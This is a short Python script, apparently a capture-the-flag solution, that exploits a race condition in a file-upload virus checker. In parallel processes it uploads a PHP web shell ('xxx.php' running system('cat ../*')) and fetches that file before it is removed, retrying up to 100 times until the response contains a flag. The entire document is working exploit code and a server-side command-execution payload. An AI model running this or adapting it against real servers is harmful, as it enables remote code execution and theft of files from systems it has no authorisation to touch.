import requests
import multiprocessing as mp
import sys

bar = mp.Barrier(2)
succ = mp.Queue()

def uploader():
    bar.wait()
    requests.post(f"http://{sys.argv[1]}:{sys.argv[2]}/", files={"file": ("xxx.php", "<?php system('cat ../*');")})

def requester():
    bar.wait()
    res = requests.get("http://viruscheckor.rumble.host/uploads/xxx.php")
    if "CSR" in res.text:
        print(res.text)
        succ.put(True)

c = 0
for _ in range(100):
    print("Iter:", c)
    c += 1
    jobs = [mp.Process(target=uploader), mp.Process(target=requester)]

    for j in jobs:
        j.start()

    for j in jobs:
        j.join()

    if not succ.empty():
        print("Worked!")
        exit(0)
